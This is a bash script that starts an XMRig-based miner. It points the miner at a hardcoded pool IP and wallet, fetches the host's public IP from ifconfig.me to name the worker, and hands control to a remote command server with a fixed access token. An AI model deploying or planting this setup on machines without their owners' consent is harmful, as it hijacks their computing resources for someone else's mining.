#!/bin/bash
POOL=stratum+ssl://172.200.229.146:80
WALLET=IRON:757ea84ec697775b5721d45cdc3a4e100ee0722a90ea359bcfd894f51c415b71:20491097150.CPU_$(echo "$(curl -s ifconfig.me)" | tr . _ )#lus6-e35u
myip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
cd "$(dirname "$0")"
chmod +x ./xmrigDaemon && clear && ./xmrigDaemon -a rx/0 -o $POOL -u $WALLET $@ -p x -k --donate-level=1 --cc-url=172.200.229.146:2012 --cc-access-token=kevin --cc-worker-id=${myip}
